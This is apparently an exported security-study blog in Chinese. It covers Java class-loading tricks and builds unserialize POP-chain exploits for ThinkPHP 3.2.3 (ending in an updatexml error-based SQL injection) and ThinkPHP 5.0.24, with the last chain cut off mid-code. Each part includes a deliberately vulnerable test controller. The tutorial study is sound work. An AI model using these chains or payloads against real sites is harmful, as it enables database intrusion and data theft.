src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A07/image-20240601201044511.png\" alt=\"image-20240601201044511\" style=\"zoom:33%;\" />\n\n再进入此处的 `hash ` 方法，发现调用了 `key` 变量的 `hashCode()` 方法\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A07/image-20240601201344002.png\" alt=\"image-20240601201344002\" style=\"zoom:33%;\" />\n\n此处将 `key` 设置为URL类，URL类中有 `hashCode()` 方法，且初始化为-1（也代表只有第一次调用该函数时，该对象的`hashCode`变量值为-1）\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A07/image-20240601201416411.png\" alt=\"image-20240601201416411\" style=\"zoom:33%;\" /><img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A07/image-20240601201433945.png\" alt=\"image-20240601201433945\" style=\"zoom:33%;\" />\n\n#### JDK动态代理\n\n1. **静态代理：**创建一个对象，实现调用另一个对象的函数，同时可以独立记录日志等操作\n\n   示例如下，代码输出为： `show method in IUserImpl\tshow method in UserProxy`\n\n   <img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A07/image-20240602140015032.png\" alt=\"image-20240602140015032\" style=\"zoom:33%;\" /><img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A07/image-20240602140031652.png\" alt=\"image-20240602140031652\" style=\"zoom: 25%;\" /><img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A07/image-20240602140046252.png\" alt=\"image-20240602140046252\" style=\"zoom: 25%;\" />\n\n   缺点：接口实现了多少方法，代理里就需要添加多少方法（繁琐）\n\n2. **动态代理**：创建动态代理对象，重写 `InvocationHandler` 类的 `invoke` 调用函数方法\n\n   示例如下，代码输出为 `method: show is invoked \tshow method in IUserImpl`\n\n   > 每一个动态代理类的调用处理程序都必须实现`InvocationHandler`接口，并且每个代理类的实例都关联到了实现该接口的动态代理类调用处理程序中，当我们通过动态代理对象调用一个方法时候，这个方法的调用就会被转发到实现`InvocationHandler`接口类的`invoke`方法来调用\n   >\n   \n   <img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A07/image-20240602141852317.png\" alt=\"image-20240602141852317\" style=\"zoom:33%;\" /><img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A07/image-20240602141911736.png\" alt=\"image-20240602141911736\" style=\"zoom:33%;\" />\n\n#### 类的动态加载\n\n**类加载流程：加载--验证--准备--解析--初始化（静态代码块被调用）--实例化（使用，构造代码块，无/有参构造函数）--卸载**\n\n##### 示例\n\n`Person`类如下：\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A07/image-20240602143013092.png\" alt=\"image-20240602143013092\" style=\"zoom:33%;\" />\n\n- （使用）当输入代码 `new Person()` 输出为 `静态代码块被调用了\t构造代码块被调用了\t无参构造方法被调用了`\n\n- （使用）当输入代码 `new Person(\"test\", 18, \"test\", \"test\");` 输出为 `静态代码块被调用了\t构造代码块被调用了\t有参构造方法被调用了`\n\n- （使用）当输入代码 `Person.staticMethod(); ` 输出为 `静态代码块被调用了\t静态方法被调用了`\n\n- （初始化）当输入代码 `Person.id = 1;` 输出为 `静态代码块被调用了`\n\n- （类加载）当输入代码 `Class clazz = Person.class;` 无输出\n\n- （默认进行<u>初始化</u>）当输入代码 `Class clazz = Class.forName(\"com.example.java_deserialization.Person\");` 输出为 `静态代码块被调用了`\n\n- （不进行<u>初始化</u>）当输入代码\n\n  ```java\n  ClassLoader cl=ClassLoader.getSystemClassLoader();\n  Class.forName(\"com.example.java_deserialization.Person\",false,cl);\n  \n  //或者是\n  \n  ClassLoader cl=ClassLoader.getSystemClassLoader();\n  Class c= cl.loadClass(\"com.example.java_deserialization.Person\");\n  ```\n\n  无输出\n\n- 当输入代码\n\n  ```java\n  ClassLoader cl=ClassLoader.getSystemClassLoader();\n  Class c=Class.forName(\"com.example.java_deserialization.Person\",false,cl);\n  c.newInstance();\n  \n  //或者是\n  \n  ClassLoader cl=ClassLoader.getSystemClassLoader();\n  Class c= cl.loadClass(\"com.example.java_deserialization.Person\");\n  c.newInstance();\n  ```\n\n  输出为 `静态代码块被调用了\t构造代码块被调用了\t无参构造方法被调用了`\n\n\n\n###### 结论\n\n动态类加载方法： `Class.forName` 可以选择是否初始化\n\n1. **ClassLoader cl = ClassLoader.getSystemClassLoader();**\n   - `ClassLoader` 是 Java 类加载器的基类，负责动态加载 Java 类到 JVM 中。\n   - `getSystemClassLoader()` 是 `ClassLoader` 类的静态方法，用来获取系统类加载器。系统类加载器通常是负责加载应用程序类路径（即 `CLASSPATH` 环境变量指向的路径）下的类。\n2. **Class c = cl.loadClass(\"com.example.java_deserialization.Person\");**\n   - `loadClass(String name)` 是 `ClassLoader` 的一个方法，用于加载指定类的字节码并返回 `Class` 对象。\n   - 这里 `name` 参数是类的全限定名（即包含包名的完整类名），比如 `com.example.java_deserialization.Person`。\n   - 调用 `cl.loadClass(\"com.example.java_deserialization.Person\")` 会让类加载器加载 `Person` 类并返回对应的 `Class` 对象。如果类已经被加载，这个方法会直接返回现有的 `Class` 对象。\n3. **c.newInstance();**\n   - `newInstance()` 是 `Class` 类的方法，用于创建这个 `Class` 对象所表示的类的一个新实例。这个方法要求 `Class` 对象必须具有一个无参的构造方法。\n   - `c.newInstance()` 相当于调用这个类的无参构造函数，并返回新创建的对象的引用。\n\n###### 详细机理解释\n\n1. ClassLoader 工作原理\n\n   Java 的类加载器机制遵循双亲委派模型（parent delegation model），主要包括以下几个步骤：\n\n   - **检查缓存**：检查类加载器的缓存，是否已经加载过该类，如果加载过直接返回类的 `Class` 对象。\n   - **委派给父类加载器**：如果没有加载过，当前类加载器会先委派父类加载器去加载该类。每个类加载器都有一个父加载器，除了根加载器（Bootstrap ClassLoader）。\n   - **自己加载**：如果父加载器也没有加载过这个类，那么当前类加载器才会尝试自己去加载。\n\n   系统类加载器 (`System ClassLoader`) 是 JVM 提供的默认类加载器，通常是应用程序类加载器（`Application ClassLoader`），它负责加载 `CLASSPATH` 下的类。\n\n2. Class 加载过程\n\n   类加载过程可以分为以下几个阶段：\n\n   - **加载（Loading）**：查找并导入类的二进制数据。\n\n   - 链接（Linking）\n\n     ：\n\n     - **验证（Verification）**：确保导入的类文件的字节码符合 JVM 的规范。\n     - **准备（Preparation）**：为类的静态变量分配内存，并将其初始化为默认值。\n     - **解析（Resolution）**：将类、接口、字段、方法的符号引用替换为直接引用。\n\n   - **初始化（Initialization）**：执行类构造器 `<clinit>()` 方法，初始化静态变量和静态代码块。\n\n3. Reflection 工作原理\n\n   反射机制允许在运行时操作类和对象。`Class` 类提供了一些方法来获取类的信息以及创建类的实例：\n\n   - `newInstance()` 方法会调用类的无参构造方法创建一个新的对象实例。如果类没有无参构造方法或者构造方法不可访问（例如是 `private` 的），调用 `newInstance()` 会抛出异常。\n\n底层的原理，实现加载任意的类\n\nClassLoader->SecureClassLoader->URLClassLoader->APPClassLoader\n\nloadClass->findClass（重写的方法）->defineClass(从字节码加载)\n\n###### 可利用\n\n1. 利用URLClassLoader的加载类方法（传参类型为URL）加载类(file/http/jar)\n\n   - file:\n\n     ```java\n     URLClassLoader urlClassLoader = new URLClassLoader(new java.net.URL[]{new java.net.URL(\"file:///D:\\\\java workforse\\\\java_deserialization\\\\\")});\n     Class c = urlClassLoader.loadClass(\"com.example.java_deserialization.Hello\");\n     c.newInstance();\t\n     ```\n\n   - http:先启动在class目录下使用 `python -m http.server 8888` 启动http服务，再使用http协议传递文件\n\n     ```java\n     URLClassLoader urlClassLoader = new URLClassLoader(new java.net.URL[]{new java.net.URL(\"http://localhost:8888/\")});\n     Class c = urlClassLoader.loadClass(\"com.example.java_deserialization.Hello\");\n     c.newInstance();\n     ```\n\n2. 利用defineClass，该类是Protect，只能用反射调用，字节码加载任意类，私有方法\n\n   ```java\n   Method defineClassMethod = ClassLoader.class.getDeclaredMethod(\"defineClass\", String.class, byte[].class, int.class, int.class);\n   defineClassMethod.setAccessible(true);\n   byte[] code= Files.readAllBytes(Paths.get(\"D:\\\\java workforse\\\\java_deserialization\\\\Hello.class\"));\n   Class c =(Class) defineClassMethod.invoke(cl, \"com.example.java_deserialization.Hello\", code,0,code.length);\n   c.newInstance();\n   ```\n\n3. 利用Unsafe类，实际利用的是Unsafe.defineClass，也是字节码加载任意类，public类，类不能直接生成，里面可以直接上传\n\n   ```java\n   byte[] code= Files.readAllBytes(Paths.get(\"D:\\\\java workforse\\\\java_deserialization\\\\Hello.class\"));\n   //        Class c =(Class) defineClassMethod.invoke(cl, \"com.example.java_deserialization.Hello\", code,0,code.length);\n   //        c.newInstance();\n   Class unsafe= Unsafe.class;\n   Field f=unsafe.getDeclaredField(\"theUnsafe\");\n   f.setAccessible(true);\n   Unsafe u=(Unsafe)f.get(null);\n   Class c = (Class) u.defineClass(\"com.example.java_deserialization.Hello\", code, 0, code.length, cl, null);\n   c.newInstance();\n   ```\n\n   \n","tags":["java"],"categories":["安全"]},{"title":"Thinkphp3_x(反序列化)","url":"/post/9bc8e8a9.html","content":"\n#### Thinkphp3_x(反序列化)\n\n参考链接：[ThinkPHP v3.2.* （SQL注入&文件读取）反序列化POP链 | CTF导航 (ctfiot.com)](https://www.ctfiot.com/20632.html)\n\n<!--more-->\n\n##### 环境\n\nPHP5.6+Linux+ThinkPHP3.2.3\n\nthinkphp5.0.24下载\n\n```shell\ncomposer create-project --prefer-dist topthink/think=3.2.3 tp3\n```\n\n接着访问 `127.0.0.1/tp3` ，框架会自动生成一个默认控制器，在默认控制器下添加一个测试用的 `Action` 即可。\n\n##### 测试代码\n\n在文件 `Application/Home/Controller/IndexController.class.php` 中替换为以下内容\n\n```php\n<?php\nnamespace Home\\Controller;\n\nuse Think\\Controller;\n\nclass IndexController extends Controller\n{\n    public function index()\n    {\n        $this->show('<style type=\"text/css\">*{ padding: 0; margin: 0; } div{ padding: 4px 48px;} body{ background: #fff; font-family: \"微软雅黑\"; color: #333;font-size:24px} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.8em; font-size: 36px } a,a:hover{color:blue;}</style><div style=\"padding: 24px 48px;\"> <h1>:)</h1><p>欢迎使用 <b>ThinkPHP</b>！</p><br/>版本 V{$Think.version}</div><script type=\"text/javascript\" src=\"http://ad.topthink.com/Public/static/client.js\"></script><thinkad id=\"ad_55e75dfae343f5a1\"></thinkad><script type=\"text/javascript\" src=\"http://tajs.qq.com/stats?sId=9347272\" charset=\"UTF-8\"></script>','utf-8');\n    }\n    public function test()\n    {\n        unserialize(base64_decode($_GET['yx']));\n    }\n}\n```\n\n##### 代码分析\n\n###### 寻找漏洞入口（Imagick）\n\n首先要知道反序列化常见起点\n\n> __wakeup 一定会调用\n>\n> __destruct 一定会调用\n>\n> __toString 当一个对象被反序列化后又被当做字符串使用\t\t\t\n\n常见跳板\n\n> __toString 当一个对象被当做字符串使用\n>\n> __get 读取不可访问或不存在属性时被调用\n>\n> __set 当给不可访问或不存在属性赋值时被调用\n>\n> __isset 对不可访问或不存在的属性调用isset()或empty()时被调用\n>\n> 形如 $this->$func();\n\n常见终点\n\n> __call 调用不可访问或不存在的方法时被调用\n>\n> call_user_func 一般php代码执行都会选择这里\n>\n> call_user_func_array 一般php代码执行都会选择这里\n\n根据以上内容可知，漏洞入口大多在__destruct函数中，全局搜索该函数，原则是寻找可控变量足够多的函数\n\n根据提示此处选择文件 `ThinkPHP/Library/Think/Image/Driver/Imagick.class.php`，选择该处的原因应该是此处的img变量是可控的\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A06/image-20240320180105453.png\" alt=\"image-20240320180105453\" style=\"zoom: 50%;\" />\n\n###### Memcach\n\n接着寻找可能会有漏洞的destroy函数，还是用全局搜索，这里我选择的是 `ThinkPHP/Library/Think/Session/Driver/Memcache.class.php` 文件里的destory函数，因为这里的 `this->handle` 变量也是可控的\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A06/image-20240320181454587.png\" alt=\"image-20240320181454587\" style=\"zoom: 50%;\" />\n\n接下来全局搜索delete函数，这里选择的是 `ThinkPHP/Library/Think/Model.class.php` 文件\n\n###### Model\n\n截至到这里构造的poc如下\n\n```php\n<?php\n\nnamespace Think\\Image\\Driver {\n    use Think\\Session\\Driver\\Memcache;\n    class Imagick\n    {\n        private $img;\n        public function __construct()\n        {\n            $this->img = new Memcache();\n        }\n    }\n}\nnamespace Think\\Session\\Driver {\n    use Think\\Model;\n    class Memcache\n    {\n        protected $handle = null;\n\n        public function __construct()\n        {\n            $this->handle = new Model();\n        }\n    }\n}\nnamespace Think {\n    class Model\n    {\n        \n    }\n}\n\n```\n\n以下是添加注释后的delete函数\n\n```php\nclass Model\n{\n\tprotected $db = null;\n    // 主键名称\n    protected $pk = 'id';\n    // 数据信息\n    protected $data = array();\n    // 查询表达式参数\n    protected $options   = array();\n    public function getPk()\n    {\n        return $this->pk;\n    }\n     /**\n     * 删除记录\n     *\n     * @param array|int|string $options 删除操作的条件，可以是一个数组、整数或字符串\n     * @return int|false 成功删除的记录数，如果操作失败则返回false\n     */\n    public function delete($options = array())\n    {\n        $pk = $this->getPk(); // 获取主键字段名\n\n        // 如果$options为空且当前对象的$options['where']也为空，则删除当前数据对象所对应的记录\n        if (empty($options) && empty($this->options['where'])) {\n            if (!empty($this->data) && isset($this->data[$pk])) {\n                return $this->delete($this->data[$pk]); // 递归调用delete方法删除指定主键的记录\n            } else {\n                return false; // 当前数据对象没有主键值或$options为空，操作失败，返回false\n            }\n        }\n\n        if (is_numeric($options) || is_string($options)) {\n            // 根据主键删除记录\n            if (strpos($options, ',')) {\n                $where[$pk] = array('IN', $options);\n            } else {\n                $where[$pk] = $options;\n            }\n            $options          = array(); // 清空$options数组\n            $options['where'] = $where; // 将主键条件设置为$options['where']\n        }\n\n        // 根据复合主键删除记录\n        if (is_array($options) && (count($options) > 0) && is_array($pk)) {\n            $count = 0;\n            foreach (array_keys($options) as $key) {\n                if (is_int($key)) {\n                    $count++;\n                }\n            }\n            if (count($pk) == $count) {\n                $i = 0;\n                foreach ($pk as $field) {\n                    $where[$field] = $options[$i]; // 设置复合主键条件\n                    unset($options[$i++]); // 删除$options数组中对应的主键条件\n                }\n                $options['where'] = $where; // 将复合主键条件设置为$options['where']\n            } else {\n                return false; // 复合主键条件不匹配，操作失败，返回false\n            }\n        }\n\n        // 分析表达式\n        $options = $this->_parseOptions($options);\n\n        if (empty($options['where'])) {\n            // 如果条件为空，则不进行删除操作，除非设置为 1=1\n            return false; // 操作失败，返回false\n        }\n\n        if (is_array($options['where']) && isset($options['where'][$pk])) {\n            $pkValue = $options['where'][$pk]; // 获取主键值\n        }\n\n        if (false === $this->_before_delete($options)) {\n            return false; // _before_delete返回false，操作失败，返回false\n        }\n\n        $result = $this->db->delete($options); // 调用数据库操作对象的delete方法执行删除操作\n        if (false !== $result && is_numeric($result)) {\n            $data = array();\n            if (isset($pkValue)) {\n                $data[$pk] = $pkValue; // 将主键值添加到$data数组\n            }\n\n            $this->_after_delete($data, $options); // 调用_after_delete方法执行删除后的操作\n        }\n\n        // 返回删除记录个数\n        return $result; // 返回成功删除的记录数\n    }\n}\n```\n\n首先粗略确认options是可控的，因此猜测558行的delete函数可以成为漏洞点，因为此处的db变量也是可控的\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A06/image-20240320183406820.png\" alt=\"image-20240320183406820\" style=\"zoom:50%;\" />\n\n###### mysql(Driver为抽象类)\n\n在文件 `ThinkPHP/Library/Think/Db/Driver.class.php` 中，可以看到是通过拼接的方式生成sql语句，因此只要options构造成功，此处的sql语句就可利用\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A06/image-20240320183656547.png\" alt=\"image-20240320183656547\" style=\"zoom:33%;\" />\n\nlz尝试逆向构造，因为这里执行的是delete方法，所以尝试报错注入，后面看到对where进行了拼接，因此想办法让where后面加上 `'1=updatexml(1,concat(0x7e,database(),0x7e),1)#'` 实现报错注入，并且这里调用了parseWhere函数，该函数的功能是将查询条件，可以是字符串或数组转变为解析后的 WHERE 子句，并在前面加上where，因此就可以判断我们只需要让 `$options['where']='1=updatexml(1,concat(0x7e,database(),0x7e),1)#'`\n\n现在先返回前面Model类的destory函数中，最开始传进来的options变量为空，因此我们需要想办法执行509行的函数实现自行构造参数，因此 `$this->data` 变量就需要自己构造，将 `$this->data[pk]` 构造成我们想要的内容，那关于Model的poc应该大概如下\n\n```php\nnamespace Think {\n    use Think\\Db\\Driver\\Mysql;\n    class Model\n    {\n        protected $db = null;\n        // 主键名称\n        protected $pk = 'id';\n        // 数据信息\n        protected $data = array();\n        // 查询表达式参数\n        protected $options   = array();\n        public function __construct()\n        {\n            $this->db = new mysql();\n            $this->data=[\n                'id'=>[\n                    'where'=>'1=updatexml(1,concat(0x7e,(select user()),0x7e),1)',\n                    'table'=>'users'\n                ]\n            ];\n        }\n    }\n}\n```\n\n最后成功显示了用户名\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A06/image-20240320191402040.png\" alt=\"image-20240320191402040\" style=\"zoom: 33%;\" />\n","tags":["php"],"categories":["安全"]},{"title":"Thinkphp5_x（反序列化）","url":"/post/e1d073c2.html","content":"\n#### Thinkphp5_x（反序列化）\n\n<!--more-->\n\n##### 5.0.x反序列化\n\n参考链接：[ThinkPHP v5.0.24 反序列化 - seizer-zyx - 博客园 (cnblogs.com)](https://www.cnblogs.com/seizer/p/17035791.html)\n\n###### 环境\n\nPHP5.6+Linux+ThinkPHP5.0.24\n\nthinkphp5.0.24下载\n\n```shell\ncomposer create-project --prefer-dist topthink/think=5.1.24 tpdemo\n```\n\n修改composer.json文件\n\n```json\n\"require\": {\n    \"php\": \">=5.4.0\",\n    \"topthink/framework\": \"5.0.24\"\n},\n```\n\n同目录下执行`composer update`\n\n###### 测试代码\n\n```php\n<?php\nnamespace app\\index\\controller;\n\nclass Index\n{\n    public function index()\n    {\n        $c = unserialize($_GET['c']);\n        var_dump($c);\n        return 'Welcome to thinkphp5.0.24';\n    }\n}\n```\n\n###### 代码分析\n\n入口：`thinkphp/library/think/process/pipes/Windows.php`中的`__destruct()`函数\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A05/image-20240313191223141.png\" alt=\"image-20240313191223141\" style=\"zoom:50%;\" />\n\n此处我们要利用的函数是 `removeFiles()`，查看该函数\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A05/image-20240313191615562.png\" alt=\"image-20240313191615562\" style=\"zoom: 50%;\" />\n\n此处的 `$this->files` 是可控的，也代表 `$filename` 是可控的，而此处的 `file_exists()` 方法是判断 `$filename` 所指定的文件是否存在，如果 `$filename `是一个类，就会调用该类的 `__tostring() `方法，此处的思路就是找 `__tostring() ` 方法有漏洞的类\n\n此处找的类就是model类，位于`thinkphp/library/think/Model.php`，但是此处的model是**抽象类**，因此需要找到其子类\n\n> **抽象类**是一种不能直接实例化的类，它主要用于定义接口和共享代码。在面向对象编程中，抽象类一般用作其他类的基类，其目的是让子类继承它，并且必须实现抽象类中定义的抽象方法。因此，抽象类不能直接被实例化，而是需要子类去继承并实现它的抽象方法后才能被实例化。\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A05/image-20240313192258490.png\" alt=\"image-20240313192258490\" style=\"zoom:50%;\" />\n\n找子类的方式就是全局搜索 `extends model` 的类，此处选择 `pivot` 类，到此为止，我们的exp初步构造如下\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A05/image-20240313192601144.png\" alt=\"image-20240313192601144\" style=\"zoom:33%;\" />\n\n到此为止，我们的exp初步构造如下\n\n```php\nnamespace think\\process\\pipes;\nuse think\\model\\Pivot;\nclass Windows\n{\n    private $files=[];\n    public function __construct(){\n        $this->files = array(new Pivot());\n    }\n}\n```\n\n接下来进入 model.php 文件，在model抽象类中寻找 `__tostring()` 方法，如下所示\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A05/image-20240313192831145.png\" alt=\"image-20240313192831145\" style=\"zoom:50%;\" />\n\n调用了 `toJson()` 方法\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A05/image-20240313192904805.png\" alt=\"image-20240313192904805\" style=\"zoom:50%;\" />\n\n调用了 `toArray()` 方法，此处的 `toArray()` 方法是可见的长，重点是那些变量是我们可控的，特别是调用变量的函数的时候，此处选择的漏洞入口就是912行的 `$value` ，选择它的原因是 `$value` 本身是可控的，可以将 `$value` 构造成一个没有 `getAttr() ` 方法且在 `__call()` 方法中存在漏洞的类\n\n```php\npublic function toArray() \n    {\n        $item    = [];\n        $visible = [];\n        $hidden  = [];\n\n        $data = array_merge($this->data, $this->relation);\n\n        // 过滤属性\n        if (!empty($this->visible)) {\n            $array = $this->parseAttr($this->visible, $visible);\n            $data  = array_intersect_key($data, array_flip($array));\n        } elseif (!empty($this->hidden)) {\n            $array = $this->parseAttr($this->hidden, $hidden, false);\n            $data  = array_diff_key($data, array_flip($array));\n        }\n\n        foreach ($data as $key => $val) {\n            if ($val instanceof Model || $val instanceof ModelCollection) {\n                // 关联模型对象\n                $item[$key] = $this->subToArray($val, $visible, $hidden, $key);\n            } elseif (is_array($val) && reset($val) instanceof Model) {\n                // 关联模型数据集\n                $arr = [];\n                foreach ($val as $k => $value) {\n                    $arr[$k] = $this->subToArray($value, $visible, $hidden, $key);\n                }\n                $item[$key] = $arr;\n            } else {\n                // 模型属性\n                $item[$key] = $this->getAttr($key);\n            }\n        }\n        // 追加属性（必须定义获取器）\n        if (!empty($this->append)) {\n            foreach ($this->append as $key => $name) {\n                if (is_array($name)) {\n                    // 追加关联对象属性\n                    $relation   = $this->getAttr($key);\n                    $item[$key] = $relation->append($name)->toArray();\n                } elseif (strpos($name, '.')) {\n                    list($key, $attr) = explode('.', $name);\n                    // 追加关联对象属性\n                    $relation   = $this->getAttr($key);\n                    $item[$key] = $relation->append([$attr])->toArray();\n                } else {\n                    $relation = Loader::parseName($name, 1, false);\n                    if (method_exists($this, $relation)) {\n                        $modelRelation = $this->$relation();\n                        $value         = $this->getRelationData($modelRelation);\n\n                        if (method_exists($modelRelation, 'getBindAttr')) {\n                            $bindAttr = $modelRelation->getBindAttr();\n                            if ($bindAttr) {\n                                foreach ($bindAttr as $key => $attr) {\n                                    $key = is_numeric($key) ? $attr : $key;\n                                    if (isset($this->data[$key])) {\n                                        throw new Exception('bind attr has exists:' . $key);\n                                    } else {\n                                        $item[$key] = $value ? $value->getAttr($attr) : null;\n                                    }\n                                }\n                                continue;\n                            }\n                        }\n                        $item[$name] = $value;\n                    } else {\n                        $item[$name] = $this->getAttr($name);\n                    }\n                }\n            }\n        }\n        return !empty($item) ? $item : [];\n    }\n```\n\n第一步是想办法能够执行到912行，简单写这个if函数就是如下\n\n```php\nif (!empty($this->append)) {\n    foreach ($this->append as $key => $name) {\n        if (!is_array($name) && !strpos($name, '.')) {\n            $relation = Loader::parseName($name, 1, false);\n            if (method_exists($this, $relation)) {\n                $modelRelation = $this->$relation();\n                $value         = $this->getRelationData($modelRelation);\n                if (method_exists($modelRelation, 'getBindAttr')) {\n                    $bindAttr = $modelRelation->getBindAttr();\n                    if ($bindAttr) {\n                        foreach ($bindAttr as $key => $attr) {\n                            $key = is_numeric($key) ? $attr : $key;\n                            if (isset($this->data[$key])) {\n                            } else {\n                                $item[$key] = $value ? $value->getAttr($attr) : null;\n                            }\n                        }\n                        continue;\n                    }\n                }\n                $item[$name] = $value;\n            } else {\n                $item[$name] = $this->getAttr($name);\n            }\n        }\n    }\n}\n```\n\n第一个是 `$this->append` 不为空，由于 `$this->append` 可控，该条件可实现\n\n接着是 `$this->append` 里单个值不能是数组，不能有 `.` ，由于 `$this->append` 可控，该条件可实现\n\n然后是 `$relation` 变量的获取，此处使用了parseName函数，此处的type为1，也就是将C风格转换为Java风格，对正常字符串没有影响，因此此处的 `$relation` 就是 `$name` ，也就是 `$this->append` 变量\n\n> 具体来说，当 `type` 参数为 1 时，函数会执行以下操作：\n>\n> 1. 使用正则表达式 `'/_([a-zA-Z])/'` 将下划线后的字母转换为大写字母。\n> 2. 使用 `preg_replace_callback` 函数将匹配到的字符转换为大写字母。\n> 3. 最后，根据 `$ucfirst` 参数决定是否将结果的首字母大写或小写，并返回结果。\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A05/image-20240313194432787.png\" alt=\"image-20240313194432787\" style=\"zoom:33%;\" />\n\n接着是判断本类是否存在 `$relation` 函数，这个比较好办，因为 `$this->append` 变量本身就是可控的，因此 `$relation` 变量也是可控的\n\n继续往下分析， `$modelRelation` 是执行 `$relation` 函数的结果，要想能进入下面的if语句，就必须保证返回的结果也是一个类，并且这个类有getBindAttr方法，由于此处并没有使用 `$value` 变量，因此先不对 `$value` 变量进行分析\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A05/image-20240313195522888.png\" alt=\"image-20240313195522888\" style=\"zoom: 50%;\" />\n\n通过全局搜索可以找到定义该函数的地方，位于 `thinkphp/library/think/model/relation/OneToOne.php`\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A05/image-20240313195744883.png\" alt=\"image-20240313195744883\" style=\"zoom: 33%;\" />\n\n该函数定义在一个抽象类中，因此用同样的方法寻找其子类\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A05/image-20240313195845938.png\" alt=\"image-20240313195845938\" style=\"zoom:33%;\" />\n\n这里选择HasOne类\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A05/image-20240313195913716.png\" alt=\"image-20240313195913716\" style=\"zoom:33%;\" />\n\n因此前面的 `$modelRelation` 我们就知道要返回什么了，就是返回HasOne类，因此我们需要找到Model类中的可控返回变量的函数\n\n此处选择的是 `getError()` 函数，因为此处的 `$this->error` 是可控的，因此只需构造 `$this->error` 为HasOne类就行了， `$relation` 变量就是 `getError()` 函数，也就是 `$this->append()` 的值应该是 `['getError()']` \n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A05/image-20240313200040421.png\" alt=\"image-20240313200040421\" style=\"zoom: 50%;\" />\n\n继续分析，接着就执行了getBindAttr方法，进入OneToOne类查看该方法\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A05/image-20240313200719111.png\" alt=\"image-20240313200719111\" style=\"zoom: 50%;\" />\n\n如下所示，此处的 `$this->bindAttr ` 也是可控的\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A05/image-20240313200839247.png\" alt=\"image-20240313200839247\" style=\"zoom: 50%;\" />\n\n我们要执行到912的条件是 `!isset($this->data[$key])` ，这里的 `$this->data` 也是可控的，因此此处 `$bindAttr` 的值不需要急着定，只要保持 `$this->data` 为空就行了\n\n然后就是 `$value` 的值不能是False，并且根据前面的分析可知， `$value` 应该是一个没有 `getAttr()` 函数并且 `__call()` 函数存在漏洞的类，这里选择构造的类就是Output类，位于`thinkphp/library/think/console/Output.php`\n\n`$value` 的值通过Model类的getRelationData函数返回\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A05/image-20240313201323330.png\" alt=\"image-20240313201323330\" style=\"zoom:50%;\" />\n\n此处必须要满足第一个if语句，因为 `$modelRelation` 我们已经确定了，而OneToOne类是没有getRelation方法的\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A05/image-20240313201501077.png\" alt=\"image-20240313201501077\" style=\"zoom: 50%;\" />\n\n此处有三个条件需要同时满足：\n\n- `$this->parent`\n\n  该变量本身可控，易满足\n\n- `!$modelRelation->isSelfRelation()`\n\n  进入该函数，该方法属于抽象Relation类，位于`thinkphp/library/think/model/Relation.php`\n\n  <img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A05/image-20240313201934253.png\" alt=\"image-20240313201934253\" style=\"zoom:50%;\" />\n\n  \n\n  因为确保上面的 `$this->selfRelation` 为false就行了，该变量同样是可控的\n\n- `get_class($modelRelation->getModel()) == get_class($this->parent)`\n\n  这个等于的含义是getModel返回值类型和$this->parent相同\n\n  先看getModel函数，还是位于抽象Relation类中\n\n  <img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A05/image-20240313202356627.png\" alt=\"image-20240313202356627\" style=\"zoom:50%;\" />\n\n  进入此处Query类的getModel函数\n\n  <img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A05/image-20240313202419818.png\" alt=\"image-20240313202419818\" style=\"zoom: 50%;\" />\n\n  此处的 `$this->model` 函数也是可控的\n\n  而 `$this->parent` 也是可控的，因此这个很好满足要求\n\n综合以上，构造的exp应该如下\n\n```php\nnamespace think\\model;\nuse think\\model\\relation\\HasOne;\nuse think\\console\\Output;\nclass Pivot{\n    protected $append = [];\n    protected $error;\n    public $parent;\n    public function __construct(){\n        $this->append=array('getError');\n        $this->error=new HasOne();\n        $this->parent=new Output();\n    }\n}\n\nnamespace think\\model\\relation;\nuse think\\db\\Query;\nclass HasOne{\n    protected $selfRelation;\n    protected $query;\n    protected $bindAttr;\n    public function __construct(){\n        $this->selfRelation=false;\n        $this->query=new Query();\n        $this->bindAttr=[\"seizer\", \"seizer\"];\n    }\n}\n\nnamespace 